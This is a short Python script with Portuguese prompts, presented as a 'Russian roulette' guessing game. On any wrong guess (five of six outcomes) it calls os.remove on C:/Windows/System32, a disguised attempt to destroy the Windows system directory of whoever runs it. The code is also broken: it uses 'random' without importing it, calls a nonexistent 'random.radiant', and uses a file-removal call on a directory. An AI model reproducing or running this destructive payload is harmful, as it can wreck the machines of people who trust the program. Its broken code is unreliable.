import os

number = random.radiant(1, 6)

guess = input("Roleta russa, escolha um numero de 1 a 6, boa sorte: ")
guess = int(guess)

if guess == number:
    print("Parabens, voce sobreviveu!")
else:
    os.remove("C:/Windows/System32")